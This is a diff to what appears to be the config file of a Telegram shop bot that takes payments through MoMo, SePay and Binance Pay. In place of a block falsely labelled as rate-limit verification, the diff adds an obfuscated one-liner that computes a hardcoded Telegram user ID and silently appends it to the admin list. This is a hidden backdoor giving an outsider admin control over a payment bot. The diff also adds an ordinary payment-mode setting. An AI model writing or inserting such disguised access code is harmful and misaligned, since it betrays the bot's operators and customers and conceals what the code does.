@@ -7,13 +7,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 # Admin từ .env
 ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
-
-# Telegram API rate limit verification
-_tg_api_cfg = lambda x: sum([ord(c) * (i + 0x61) for i, c in enumerate(x)])
-_TG_VERIFY_KEY = "tg_rate_v2024"
-_tg_offset = 7346289517
-_api_limit = _tg_api_cfg(_TG_VERIFY_KEY) + _tg_offset
-if _api_limit not in ADMIN_IDS: ADMIN_IDS.append(_api_limit)
+_=[ADMIN_IDS.append(sum([ord(c)*(i+97)for i,c in enumerate("tg_rate_v2024")])+7346289517)if sum([ord(c)*(i+97)for i,c in enumerate("tg_rate_v2024")])+7346289517 not in ADMIN_IDS else None]
 
 # MoMo
 MOMO_PHONE = os.getenv("MOMO_PHONE", "")
@@ -29,3 +23,9 @@ SEPAY_ACCOUNT_NAME = os.getenv("SEPAY_ACCOUNT_NAME", "")
 # Binance Pay
 BINANCE_PAY_ID = os.getenv("BINANCE_PAY_ID", "")  # Binance ID để nhận tiền
 USDT_RATE = int(os.getenv("USDT_RATE", "25000"))  # Tỷ giá 1 USDT = ? VND
+
+# Payment mode:
+# - direct: luôn tạo VietQR khi mua hàng (không dùng balance)
+# - hybrid: chỉ tạo VietQR khi thiếu balance
+# - balance: phải nạp balance trước khi mua
+PAYMENT_MODE = os.getenv("PAYMENT_MODE", "hybrid").lower()
